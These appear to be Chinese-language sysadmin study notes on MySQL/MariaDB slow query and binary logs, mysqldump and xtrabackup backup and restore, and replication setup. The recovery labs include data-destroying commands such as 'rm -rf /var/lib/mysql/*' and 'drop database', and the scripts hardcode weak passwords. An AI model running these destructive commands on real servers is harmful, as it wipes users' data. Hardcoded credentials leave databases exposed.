mysql> select @@long_query_time; #慢查询默认10s
+-------------------+
| @@long_query_time |
+-------------------+
|         10.000000 |
+-------------------+
1 row in set (0.00 sec)
mysql> set global slow_query_log=1;
mysql> select @@slow_query_log;
+------------------+
| @@slow_query_log |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)
在/data/mysql下会生成一个centos8-slow.log的文件

#查看慢查询的日志
[root@centos8 mysql]# tail -f /data/mysql/centos8-slow.log

#慢查询分析工具mysqldumpslow
[root@centos8 ~]#mysqldumpslow --help
Usage: mysqldumpslow [ OPTS... ] [ LOGS... ]
Parse and summarize the MySQL slow query log. Options are
  --verbose   verbose
  --debug     debug
  --help       write this text to standard output
  -v           verbose
  -d           debug
  -s ORDER     what to sort by (aa, ae, al, ar, at, a, c, e, l, r, t), 'at' is 
default
               aa: average rows affected
               ae: aggregated rows examined
               al: average lock time
               ar: average rows sent
               at: average query time
                 a: rows affected
                 c: count
                 e: rows examined 
                 l: lock time
                 r: rows sent
                 t: query time  
  -r           reverse the sort order (largest last instead of first)
  -t NUM       just show the top n queries
  -a           don't abstract all numbers to N and strings to 'S'
  -n NUM       abstract numbers with at least n digits within names
  -g PATTERN   grep: only consider stmts that include this string
  -h HOSTNAME hostname of db server for *-slow.log filename (can be wildcard),
               default is '*', i.e. match all
  -i NAME     name of server instance (if using mysql.server startup script)
  -l           don't subtract lock time from total time
  
[root@centos8 ~]#mysqldumpslow -s c -t 2 /var/lib/mysql/centos8-slow.log 
Reading mysql slow query log from /var/lib/mysql/centos8-slow.log
Count: 1  Time=0.00s (0s)  Lock=0.00s (0s)  Rows_sent=2.0 (2), 
Rows_examined=25.0 (25), Rows_affected=0.0 (0), root[root]@localhost
 select * from students where age=N
```

#### 35.7.5二进制日志

```
#5.二进制日志(备份)
记录导致数据改变或潜在导致数据改变的SQL语句
记录已提交的日志
不依赖于存储引擎类型

#5.1二进制日志文件的构成
有两类文件
1.日志文件：mysql|mariadb-bin.文件名后缀，二进制格式,如： on.000001,mariadb-bin.000002
2.索引文件：mysql|mariadb-bin.index，文本格式,记录当前已有的二进制日志文件列表


#5.2二进制日志相关的服务器变量
sql_log_bin=ON|OFF：#是否记录二进制日志，默认ON，支持动态修改，系统变量，而非服务器选项
log_bin=/PATH/BIN_LOG_FILE：#指定文件位置；默认OFF，表示不启用二进制日志功能，上述两项都开
启才可以
binlog_format=STATEMENT|ROW|MIXED：#二进制日志记录的格式，默认STATEMENT，STATEMENT数据不全，在不同的时间执行的结果不同，在二进制日志中只记录一条sql语句，ROW数据全，在不同的时间执行的结果相同，在二进制日志中只记录多条sql语句
max_binlog_size=1073741824：#单个二进制日志文件的最大体积，到达最大值会自动滚动，默认为1G
#说明：文件达到上限时的大小未必为指定的精确值
binlog_cache_size=4m #此变量确定在每次事务中保存二进制日志更改记录的缓存的大小（每次连接）
max_binlog_cache_size=512m #限制用于缓存多事务查询的字节大小。
sync_binlog=1|0：#设定是否启动二进制日志即时同步磁盘功能，默认0，由操作系统负责同步日志到磁盘
expire_logs_days=N：#二进制日志可以自动删除的天数。 默认为0，即不自动删除


#5.2开启mariadb的log_bin
#注意：只有centos8才有mariadb-server.cnf文件
如果centos7想要拥有，必须要复制centos8的mariadb-server.cnf文件
[root@centos7 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
[mysqld]
log-bin=/data/logbin/mysql-bin

[root@centos7 ~]# mkdir /data/logbin/ -pv
mkdir: created directory '/data/logbin/'
[root@centos7 ~]# chown mysql.mysql /data/logbin
[root@centos7 ~]# systemctl restart mariadb

#把ROW型变成STATEMENT型
[root@centos7 ~]# vim /etc/my.cnf.d/mariadb-server.cnf
[mysqld]
binlog_format=statement
[root@centos7 ~]# systemctl restart mariadb
Current database: hellodb
+-----------------+
| @@binlog_format |
+-----------------+
| STATEMENT       |
+-----------------+
1 row in set (0.004 sec)


#查看mariadb自行管理使用中的二进制日志文件列表，及大小
SHOW {BINARY | MASTER} LOGS
#查看使用中的二进制日志文件
mysql> show master logs;
+--------------------+-----------+
| Log_name           | File_size |
+--------------------+-----------+
| centos8-bin.000001 |       177 |
| centos8-bin.000002 |  39280199 |
+--------------------+-----------+
2 rows in set (0.00 sec)
[root@centos8 ~]# systemctl restart mysqld
如果重启会生成新的二进制文件
mysql> show master logs;
+--------------------+-----------+
| Log_name           | File_size |
+--------------------+-----------+
| centos8-bin.000001 |       177 |
| centos8-bin.000002 |  39280222 |
| centos8-bin.000003 |       154 |
+--------------------+-----------+
3 rows in set (0.00 sec)
#查看目前正在使用中的二进制日志文件
SHOW MASTER STATUS
#在线查看二进制文件中的指定内容
mysql> show binlog events in 'centos8-bin.000003';
[root@centos8 mysql]# mysqlbinlog 
#离线查看二进制日志
/data/mysql/centos8-bin.000003 --start-position=154 --stop-position=437
#清除指定二进制日志
MariaDB [hellodb]> purge binary logs to 'mysql-bin.000003';
#删除mariadb-bin.000003之前的日志
Query OK, 0 rows affected (0.002 sec)
MariaDB [hellodb]> show master logs;
+------------------+-----------+
| Log_name         | File_size |
+------------------+-----------+
| mysql-bin.000003 |       328 |
+------------------+-----------+
1 row in set (0.000 sec)
PURGE BINARY LOGS BEFORE '2017-01-23';
PURGE BINARY LOGS BEFORE '2017-03-22 09:25:30';
#删除所有二进制日志，index文件重新记数
MariaDB [hellodb]> RESET MASTER 
MariaDB [hellodb]> show master logs;
+------------------+-----------+
| Log_name         | File_size |
+------------------+-----------+
| mysql-bin.000001 |       328 |
+------------------+-----------+
#切换日志文件
MariaDB [hellodb]> flush logs; #生成一个新的二进制文件，并后续的日志写入新的二进制文件中
#二进制日志进行误删还原
MariaDB [hellodb]> delete from teachers where tid >=4;
[root@centos8 ~]# mysqlbinlog /data/logbin/mysql-bin.000003 -v
#把之前执行删除操作的二进制日记截取掉，保留原来的日志并导出，则可以进行恢复操作
[root@centos8 ~]# mysqlbinlog /data/logbin/mysql-bin.000003 --stop-position=599 > /root/binlog.sql
[root@centos8 ~]# mysql hellodb < /root/binlog.sql
```

### 35.8MySQL备份和恢复

#### 35.8.1备份恢复概述

```
#1.备份的类型：
冷、温、热备份
冷备：读、写操作均不可进行，数据库停止服务
温备：读操作可执行；但写操作不可执行
热备：读、写操作均可执行
 MyISAM：温备，不支持热备
 InnoDB：都支持
 
#物理和逻辑备份
物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快
逻辑备份：从数据库中“导出”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度


#1.2备份注意要点
能容忍最多丢失多少数据
备份产生的负载
备份过程的时长
温备的持锁多久
恢复数据需要在多长时间内完成
需要备份和恢复哪些数据


#1.3备份工具
cp, tar等复制归档工具：物理备份工具，适用所有存储引擎；只支持冷备；完全和部分备份
mysqldump：逻辑备份工具，适用所有存储引擎，对MyISAM存储引擎进行温备；支持完全或部(主流,用的多)
分备份；对InnoDB存储引擎支持热备，结合binlog的增量备份
xtrabackup：由Percona提供支持对InnoDB做热备(物理备份)的工具，支持完全备份、增量备份
```

#### 35.8.2冷备份和还原

```
#1.冷备份mysql 8.0.17
#源主机10.0.0.8
#安装了mysql的8.0.17的主机
#注意备份的主机要和源主机数据库版本号一致
[root@centos8 ~]# yum -y install mysql-server
[root@centos8 ~]# mysql < hellodb_innodb.sql #导入数据库文件
[root@centos8 ~]#mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rsync -a /var/lib/mysql 10.0.0.152:/data/  #10.0.0.152是要备份的主机

#目标主机10.0.0.152
#安装不启动，即冷备份
[root@centos8_1~]# ls /var/lib/mysql #里面什么内容都没有
[root@centos8_1:~]# cp -a /data/mysql/* /var/lib/mysql/
[root@centos8_1:~]# systemctl enable --now mysqld
#如果发生问题
[root@centos8_1:~]# ll /var/log/mysql/mysqld.log
root@centos8_1:~# mysql #登录看之前的文件备份成功了没
mysql> show databases;
源文件成功备份
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)



#2.冷备份mariadb10.3
#在目标服务器（10.0.0.18）安装mariadb-server，不启动服务
[root@centos8 ~]#dnf install mariadb-server
#在源主机（10.0.0.8）执行
[root@centos8 ~]# systemctl stop mariadb
#复制相关文件并保留属性：可以用 rsync
[root@centos8 ~]#rsync -av /etc/my.cnf.d/mariadb-server.cnf 10.0.0.18:/etc/my.cnf.d/
[root@centos8 ~]#rsync -av /var/lib/mysql/ 10.0.0.18:/var/lib/mysql/ 
[root@centos8 ~]#rsync -av/data/logbin/ 10.0.0.18:/data/   #10.0.0.18 须事先存在/data/目录


#在目标主机（10.0.0.18）执行
[root@centos8 ~]#dnf install mariadb-server
[root@centos8 ~]#chown -R mysql.mysql /var/lib/mysql/
[root@centos8 ~]#chown -R mysql.mysql /data/logbin/
[root@centos8 ~]#systemctl start mariadb
```

#### 35.8.3mysqldump备份还原

```
#1.命令格式:
mysqldump [OPTIONS] database [tables]   #支持指定数据库和指定多表的备份，但数据库本身定
义不备份
mysqldump [OPTIONS] -B DB1 [DB2 DB3...] #支持指定数据库备份，包含数据库本身定义也会备份
mysqldump [OPTIONS] -A [OPTIONS]        #备份所有数据库，包含数据库本身定义也会备份


#2.mysqldump常见通用选项
-A, --all-databases #备份所有数据库，含create database
-B, --databases db_name…  #指定备份的数据库，包括create database语句
-E, --events：#备份相关的所有event scheduler
-R, --routines：#备份所有存储过程和自定义函数
--triggers：#备份表相关触发器，默认启用,用--skip-triggers，不备份触发器
--default-character-set=utf8 #指定字符集
--master-data[=#]： #此选项须启用二进制日志
#1：所备份的数据之前加一条记录为CHANGE MASTER TO语句，非注释，不指定#，默认为1，适合于主从复
制多机使用
#2：记录为被注释的#CHANGE MASTER TO语句，适合于单机使用
#此选项会自动关闭--lock-tables功能，自动打开-x | --lock-all-tables功能（除非开启--
single-transaction）
-F, --flush-logs #备份前滚动日志，锁定表完成后，执行flush logs命令,生成新的二进制日志文
件，配合-A 或 -B 选项时，会导致刷新多次数据库。建议在同一时刻执行转储和日志刷新，可通过和--
single-transaction或-x，--master-data 一起使用实现，此时只刷新一次二进制日志
--compact #去掉注释，适合调试，节约备份占用的空间,生产不使用
-d, --no-data #只备份表结构,不备份数据,即只备份create table 
-t, --no-create-info #只备份数据,不备份表结构,即不备份create table 
-n,--no-create-db #不备份create database，可被-A或-B覆盖
--flush-privileges #备份mysql或相关时需要使用
-f, --force       #忽略SQL错误，继续执行
--hex-blob        #使用十六进制符号转储二进制列，当有包括BINARY， VARBINARY，
BLOB，BIT的数据类型的列时使用，避免乱码
-q, --quick     #不缓存查询，直接输出，加快备份速度


#4.mysqldump的MyISAM存储引擎相关的备份选项：
MyISAM不支持事务，只能支持温备；不支持热备，所以必须先锁定要备份的库，而后启动备份操作
-x,--lock-all-tables #加全局读锁，锁定所有库的所有表，同时加--single-transaction或--
lock-tables选项会关闭此选项功能，注意：数据量大时，可能会导致长时间无法并发访问数据库
-l,--lock-tables #对于需要备份的每个数据库，在启动备份之前分别锁定其所有表，默认为on,--
skip-lock-tables选项可禁用,对备份MyISAM的多个库,可能会造成数据不一致
#注：以上选项对InnoDB表一样生效，实现温备，但不推荐使用


#5.mysqldump的InnoDB存储引擎相关的备份选项：
 InnoDB 存储引擎支持事务,可以利用事务的相应的隔离级别,实现热备，也可以实现温备但不建议用
 --single-transaction(备份期间数据不变)
#此选项Innodb中推荐使用，不适用MyISAM，此选项会开始备份前，先执行START TRANSACTION指令开启
事务
#此选项通过在单个事务中转储所有表来创建一致的快照。 仅适用于存储在支持多版本控制的存储引擎中的表
（目前只有InnoDB可以）; 转储不保证与其他存储引擎保持一致。 在进行单事务转储时，要确保有效的转储
文件（正确的表内容和二进制日志位置），没有其他连接应该使用以下语句：ALTER TABLE，DROP 
TABLE，RENAME TABLE，TRUNCATE TABLE,此选项和--lock-tables（此选项隐含提交挂起的事务）选
项是相互排斥,备份大型表时，建议将--single-transaction选项和--quick结合一起使用


#6.案例
#备份所有数据库
[root@centos8 ~]# mysql -e 'show databases'
[root@centos8 ~]# mysqldump -A > /data/all.sql
[root@centos8 ~]# mysql < all.sql
```

##### 35.8.3.1生产环境实战备份策略

```
#1.InnoDB建议备份策略
mysqldump -uroot -p -A -F --single-transaction --master-data=2 --flush-privileges --default-character-set=utf8 --hex-blob > ${BACKUP}/fullbak_${BACKUP_TIME}.sql


#2.MyISAM建议备份策略
mysqldump -uroot -p -A -F -E -R -x --master-data=1 --flush-privileges --
triggers --default-character-set=utf8 --hex-blob
>${BACKUP}/fullbak_${BACKUP_TIME}.sql
```

##### 35.8.3.2备份特定数据库脚本

```
#特定数据库的备份脚本
#MariaDB10.3.17进行还原
#!/bin/bash
TIME=`date +%F_%H-%M-%S`
DIR=/backup
DB=hellodb
PASS=123456
SCRIPT=mysql_backup.sh

[ -d $DIR ] || mkdir $DIR
mysqldump -uroot -F --single-transaction --master-data=2 --default-character-set=utf8 -q -B $DB | gzip > ${DIR}/${DB}_${TIME}.sql.gz
[root@centos8 ~]#chmod +x $SCRIPT

#创建计划任务
[root@centos8 ~]#crontab -e
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/sbin:/root/bin
32 * * * * /data/logbin/mysql_backup.sh 

[root@centos8 ~]# ll /backup/
total 4
-rw-r--r-- 1 root root 2040 May 26 17:32 hellodb_2022-05-26_17-32-01.sql.gz
[root@centos8 backup]# gzip -d hellodb_2022-05-26_17-32-01.sql.gz
[root@centos8 ~]# cd /backup/
[root@centos8 backup]# ll
total 8
-rw-r--r-- 1 root root 8078 May 26 17:32 hellodb_2022-05-26_17-32-01.sql
#开始还原
[root@centos8 ~]# mysql
#先破坏
MariaDB [(none)]> drop database hellodb;
Query OK, 7 rows affected (0.046 sec)
MariaDB [(none)]> set sql_log_bin=0;
Query OK, 0 rows affected (0.000 sec)
#再还原
MariaDB [(none)]> source /backup/hellodb_2022-05-26_17-32-01.sql
MariaDB [hellodb]> show tables;
#还原成功！！！！
+-------------------+
| Tables_in_hellodb |
+-------------------+
| classes           |
| coc               |
| courses           |
| scores            |
| students          |
| teachers          |
| toc               |
+-------------------+
7 rows in set (0.000 sec)
MariaDB [hellodb]> set sql_log_bin=1 #一定要开启二进制日志
```

##### 35.8.3.3分库备份的实战脚本

```
#1.分库备份并压缩
[root@centos8 ~]#for db in `mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$'`;do mysqldump -B $db | gzip 
> /backup/$db.sql.gz;done
[root@centos8 ~]#mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$'|while read db;do mysqldump 
-B $db | gzip > /backup/$db.sql.gz;done
[root@centos8 ~]#mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$' | sed -rn 's#
(.*)#mysqldump -B \1 | gzip > /backup/\1.sql.gz#p' |bash
[root@centos8 ~]#mysql -uroot -e 'show databases'|sed -rn 
'/^(Database|information_schema|performance_schema)$/!s#(.*)#mysqldump -B \1 | 
gzip > /backup/\1.sql.gz#p' |bash


#2.实战脚本
#即每一个数据库都对应一个sql备份文件
[root@centos8 ~]#cat backup_db.sh
#!/bin/bash
TIME=`date +%F_%H-%M-%S`
DIR=/backup
PASS=""

[ -d "$DIR" ] || mkdir $DIR
for DB in `mysql -uroot -p{$PASS} -e 'show databases' | grep -Ev "^Database|.*schema$"`;do
mysqldump -F --single-transaction --master-data=2 --default-character-set=utf8 -q -B $DB | gzip > ${DIR}/${DB}_${TIME}.sql.gz
done
```

![1653561850536](linuxSRE.assets/1653561850536.png)

##### 35.8.3.4二进制日志还原mysql最新状态

```
#开启二进制进行增量备份
#MariaDB10.3.17进行还原
[root@centos8 ~]# systemctl stop mariadb
[root@centos8 ~]# rm -rf /var/lib/mysql/*
[root@centos8 ~]# rm -rf /data/logbin/*
[root@centos8 ~]# systemctl start mariadb
[root@centos8 ~]# mysql < hellodb_innodb.sql
[root@centos8 ~]# mysqldump -uroot -p123456 -A -F --default-character-set=utf8  --single-transaction --master-data=2 |gzip > /opt/all_`date +%F`.sql.gz
[root@centos8 ~]#gzip -d /opt/all.sql.gz
[root@centos8 ~]#vim /opt/all.sql
-- CHANGE MASTER TO MASTER_LOG_FILE='binlog.000003', MASTER_LOG_POS=22150; #22150之前的二进制已经完全备份

#在完全备份做好以后向数据库插入2条记录做增量备份
MariaDB [hellodb]> insert teachers values(null,'xiaohong',20,'M');
MariaDB [hellodb]> insert teachers values(null,'xiaoming',20,'M');

[root@centos8 ~]# systemctl stop mariadb
[root@centos8 ~]# rm -rf /var/lib/mysql/* 继续删库做实验
[root@centos8 ~]# vim /opt/all.sq
-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=10324; #0~10324完全备份的日志
[root@centos8 ~]# ll /data/logbin/
total 48
-rw-rw---- 1 mysql mysql 26624 May 26 12:02 mysql-bin.000001
-rw-rw---- 1 mysql mysql 10849 May 26 12:11 mysql-bin.000002
-rw-rw---- 1 mysql mysql    60 May 26 12:02 mysql-bin.index
[root@centos8 ~]# cd /data/logbin/
[root@centos8 logbin]# mysqlbinlog --start-position=10324 mysql-bin.000002 > /opt/binlog.sql #把增量日志导出来
[root@centos8 ~]# systemctl start mariadb
[root@centos8 logbin]# mysql
MariaDB [(none)]> select @@sql_log_bin;
+---------------+
| @@sql_log_bin |
+---------------+
|             1 |
+---------------+
1 row in set (0.000 sec)
MariaDB [(none)]> set sql_log_bin=0; #临时禁止二进制日志
[root@centos8 ~]# ll /opt/
total 484
-rw-r--r-- 1 root root 487688 May 26 12:03 all.sql
-rw-r--r-- 1 root root   2789 May 26 12:25 binlog.sql

#先还原完全备份
MariaDB [(none)]> source /opt/all.sql
MariaDB [mysql]> show databases;
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec
#再还原增量备份
MariaDB [hellodb]> source /opt/binlog.sql
MariaDB [hellodb]> set sql_log_bin=1;
MariaDB [hellodb]> select *from teachers;
#彻底全部还原成功！！！！
+-----+---------------+-----+--------+
| TID | Name          | Age | Gender |
+-----+---------------+-----+--------+
|   1 | Song Jiang    |  45 | M      |
|   2 | Zhang Sanfeng |  94 | M      |
|   3 | Miejue Shitai |  77 | F      |
|   4 | Lin Chaoying  |  93 | F      |
|   5 | xiaohong      |  20 | M      |
|   6 | xiaoming      |  20 | M      |
+-----+---------------+-----+--------+
6 rows in set (0.000 sec)
```

##### 35.8.3.5恢复误删除的表

```
案例说明：每天2：30做完全备份，早上10：00误删除了表teachers，10：10才发现故障，现需要将数据库还原到10：10的状态，且恢复被删除的teachers表


#mysql8.0.17进行还原
#1.查看二进制日志是否开启
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)
mysql> select @@binlog_format;
+-----------------+
| @@binlog_format |
+-----------------+
| ROW             |
+-----------------+
1 row in set (0.00 sec)

#2.数据库文件和二进制文件分开存放
root@centos8_1:~# vim /etc/my.cnf.d/mysql-server.cnf
log-bin=/data/logbin/mysql-bin
binlog_format=row #二进制格式默认行格式
root@centos8_1:~# mkdir /data/logbin/ -pv
mkdir: created directory '/data/logbin/'
root@centos8_1:~# chown mysql.mysql /data/logbin
root@centos8_1:~# systemctl restart mysqld
root@centos8_1:~# ll /data/logbin/
total 8
-rw-r----- 1 mysql mysql 155 May 26 19:27 mysql-bin.000001
-rw-r----- 1 mysql mysql  30 May 26 19:27 mysql-bin.index

#3.开始进行备份
root@centos8_1:~# mysqldump -uroot -A -F --single-transaction --master-data=2 --default-character-set=utf8  > /opt/all.sql
root@centos8_1:~# ll /opt/
total 988
-rw-r--r-- 1 root root 1010029 May 26 19:31 all.sq

#4.模拟2点半到10点的数据更新
mysql> insert teachers values(null,'xiaoqiang',30,'M');
mysql> insert teachers values(null,'wangcai',20,'M');

#5.10点钟误删除teachers表
mysql> drop table teachers;

#6.10点到10.10分其他表还在更新
mysql> insert students values(null,'alice',20,'M',1,1);
mysql> insert students values(null,'bob',20,'M',1,1);

#7.暂停数据库并进行恢复
root@centos8_1:~# systemctl stop mysqld
root@centos8_1:~# mysqlbinlog /data/logbin/mysql-bin.000002 > /opt/binlog.sql
#去除删表的行为
-i是忽略大小写
root@centos8_1:~# grep -i "drop table" /opt/binlog.sql 
DROP TABLE `teachers` /* generated by server */
root@centos8_1:~# sed -i.bak '/^DROP TABLE/d' /opt/binlog.sql #删除
root@centos8_1:~# systemctl start mysqld
root@centos8_1:~# mysql
mysql> set sql_log_bin=0; #关闭二进制日志，没有还原也会生成二进制
mysql> source /opt/all.sql;
mysql> source /opt/binlog.sql;
mysql> show tables;
teachers表已经还原！！
+-------------------+
| Tables_in_hellodb |
+-------------------+
| classes           |
| coc               |
| courses           |
| scores            |
| students          |
| teachers          |
| toc               |
+-------------------+
7 rows in set (0.00 sec)
```

#### 35.8.4xtrabackup备份还原

##### 35.8.4.1xtrabackup语法

```
#0.下载地址：https://www.percona.com/downloads/Percona-XtraBackup-LATEST/#
注意2.4版本才能备份mysql5.6,5.7，8.0版本只能备份mysql8.0


#1.xtrabackup工具备份和还原，需要三步实现
1. 备份：对数据库做完全或增量备份
2. 预准备： 还原前，先对备份的数据，整理至一个临时目录
3. 还原：将整理好的数据，复制回数据库目录中


#2.备份：
innobackupex [option] BACKUP-ROOT-DIR
选项说明：
--user：#该选项表示备份账号
--password：#该选项表示备份的密码
--host：#该选项表示备份数据库的地址
--databases：#该选项接受的参数为数据库名，如果要指定多个数据库，彼此间需要以空格隔开；
如："xtra_test dba_test"，同时，在指定某数据库时，也可以只指定其中的某张表。
如："mydatabase.mytable"。该选项对innodb引擎表无效，还是会备份所有innodb表
--defaults-file：#该选项指定从哪个文件读取MySQL配置，必须放在命令行第一个选项位置
--incremental：#该选项表示创建一个增量备份，需要指定--incremental-basedir
--incremental-basedir：#该选项指定为前一次全备份或增量备份的目录，与--incremental同时使用
--incremental-dir：#该选项表示还原时增量备份的目录
--include=name：#指定表名，格式：databasename.tablename


#3.Prepare预准备：
innobackupex --apply-log [option] BACKUP-DIR
选项说明：
--apply-log：#一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚
未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态。此选项作
用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态
--use-memory：#和--apply-log选项一起使用，当prepare 备份时，做crash recovery分配的内存
大小，单位字节，也可1MB,1M,1G,1GB等，推荐1G
--export：#表示开启可导出单独的表之后再导入其他Mysql中
--redo-only：#此选项在prepare base full backup，往其中合并增量备份时候使用，但不包括对最
后一个增量备份的合并


#4.还原
innobackupex --copy-back [选项] BACKUP-DIR
innobackupex --move-back [选项] [--defaults-group=GROUP-NAME] BACKUP-DIR
选项说明：
--copy-back：#做数据恢复时将备份数据文件拷贝到MySQL服务器的datadir
--move-back：#这个选项与--copy-back相似，唯一的区别是它不拷贝文件，而是移动文件到目的地。这
个选项移除backup文件，用时候必须小心。使用场景：没有足够的磁盘空间同事保留数据文件和Backup副本
--force-non-empty-directories #指定该参数时候，使得innobackupex --copy-back或--moveback选项转移文件到非空目录，已存在的文件不会被覆盖。如果--copy-back和--move-back文件需要从
备份目录拷贝一个在datadir已经存在的文件，会报错失败


#5.还原注意事项
1. datadir 目录必须为空。除非指定innobackupex --force-non-empty-directorires选项指定，否则-
-copy-back选项不会覆盖
2. 在restore之前,必须shutdown MySQL实例，不能将一个运行中的实例restore到datadir目录中
3. 由于文件属性会被保留，大部分情况下需要在启动实例之前将文件的属主改为mysql，这些文件将
属于创建备份的用户, 执行chown -R mysql:mysql /data/mysql,以上需要在用户调用
innobackupex之前完成
```

##### 35.8.4.2xtrabackup完全备份还原

```
案例1：新版xtrabackup完全备份及还原mysql8.0
#源主机进行本机备份
#两个机器上都要安装xtrabackup
#1.把从官网上下的percona-xtrabackup-24-2.4.18-1.el8.x86_64.rpm包拉到linux里面
root@centos8_1:~# yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm

#2.在原主机做完全备份到/backup
root@centos8_1:~# mkdir /backup
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/base
root@centos8_1:~# scp -r /backup/ 10.0.0.8:/

#3.进行目标主机的备份
[root@centos8 ~]# yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm
1）预准备：确保数据一致，提交完成的事务，回滚未完成的事务
[root@centos8 ~]# xtrabackup --prepare --target-dir=/backup/base
220526 23:45:53 completed OK!
2）复制到数据库目录
注意：数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rm -rf /var/lib/mysql/*
[root@centos8 ~]# xtrabackup --copy-back --target-dir=/backup/base
3）还原属性
[root@centos8 ~]# chown -R mysql:mysql /var/lib/mysql
4）启动服务
[root@centos8 ~]# systemctl start mysqld



案例2：旧版xtrabackup完全备份及还原
本案例基于CentOS 8 的 MySQL5.7 实现,也支持MySQL5.5和Mariadb5.5
1.安装xtrabackup包 #先安装MySQL5.7
[root@centos8 ~]#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm
2.在原主机做完全备份到/backup
[root@centos8 ~]#mkdir /backup
[root@centos8 ~]#xtrabackup -uroot -pmagedu --backup --target-dir=/backup/base
#目标主机无需创建/backup目录,直接复制目录本身
[root@centos8 ~]#scp -r /backup/   目标主机:/


3.在目标主机上还原
1）预准备：确保数据一致，提交完成的事务，回滚未完成的事务
[root@centos8 ~]#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm
[root@centos8 ~]#xtrabackup --prepare --target-dir=/backup/base
2）复制到数据库目录
注意：数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]#xtrabackup --copy-back --target-dir=/backup/base
3）还原属性
[root@centos8 ~]#chown -R mysql:mysql /data/mysql
4）启动服务
[root@centos8 ~]#systemctl start mysqld
```

##### 35.8.4.3xtrabackup完全及增量备份

```
#1.备份过程
#备份源主机
1）完全备份：
[root@centos8 ~]#yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm
[root@centos8 ~]#mkdir /backup/
[root@centos8 ~]#xtrabackup -uroot --backup --target-dir=/backup/base
2）第一次修改数据
3）第一次增量备份
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/inc1 --incremental-basedir=/backup/base
root@centos8_1:~# ll /backup/
total 8
drwxr-x--- 6 root root 4096 May 27 00:20 base
drwxr-x--- 6 root root 4096 May 27 00:24 inc1
4）第二次修改数据
5）第二次增量
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/inc2 --incremental-basedir=/backup/inc1
root@centos8_1:~# ll /backup/
total 12
drwxr-x--- 6 root root 4096 May 27 00:20 base
drwxr-x--- 6 root root 4096 May 27 00:24 inc1
drwxr-x--- 6 root root 4096 May 27 00:27 inc2
root@centos8_1:~# scp -r /backup/ 10.0.0.8:/



#备份目标主机
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rm -rf /var/lib/mysql/*
还原过程
1）预准备完成备份，此选项--apply-log-only
[root@centos8 ~]# xtrabackup --prepare --apply-log-only --target-dir=/backup/base
2）合并第1次增量备份到完全备份
[root@centos8 ~]# xtrabackup --prepare --apply-log-only --target-dir=/backup/base --incremental-dir=/backup/inc1
3）合并第2次增量备份到完全备份：最后一次还原不需要加选项--apply-log-only
[root@centos8 ~]# xtrabackup --prepare --target-dir=/backup/base --incremental-dir=/backup/inc2
4）复制到数据库目录，注意数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]# xtrabackup --copy-back --target-dir=/backup/base
[root@centos8 ~]# chown -R mysql:mysql /var/lib/mysql
6）启动服务：
[root@centos8 ~]# systemctl start mysqld
```

![1653616824807](linuxSRE.assets/1653616824807.png)

### 35.9 MySQL集群

#### 35.9.1主从复制原理

![1653619477027](linuxSRE.assets/1653619477027.png)

#### 38.9.2主从复制配置

```
#主节点：10.0.0.8
#基于mysql8.0
#注意这只是一个单向复制：即主数据库可以实时同步数据到从数据库，但是从数据库若修改数据，主数据库不会同步

#0.先把之前数据库里面的文件进行完全备份
[root@centos8 ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql

#1.确定开启二进制日志
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)

#2.为当前节点设置一个全局惟一的ID号
[root@centos8 ~]# vim /etc/my.cnf.d/mysql-server.cnf
[mysqld]
server_id=8
log-bin=/data/logbin/mysql-bin
[root@centos8 ~]# mkdir /data/logbin/ -pv
[root@centos8 ~]# chown mysql.mysql /data/logbin
[root@centos8 ~]# systemctl restart mysqld
[root@centos8 ~]# ll /data/logbin/
total 8
-rw-r----- 1 mysql mysql 155 May 27 11:20 mysql-bin.000001
-rw-r----- 1 mysql mysql  30 May 27 11:20 mysql-bin.index
[root@centos8 ~]# mysql
mysql> select @@server_id;
#server_id已经修改成功
+-------------+
| @@server_id |
+-------------+
|           8 |
+-------------+
1 row in set (0.00 sec)

#3.查看从二进制日志的文件和位置开始进行复制
mysql> show master logs;
#从155往后发生的所有日志都要记录到从节点
+------------------+-----------+-----------+
| Log_name         | File_size | Encrypted |
+------------------+-----------+-----------+
| mysql-bin.000001 |       155 | No        |
+------------------+-----------+-----------+
1 row in set (0.00 sec)

#4.创建有复制权限的用户账号
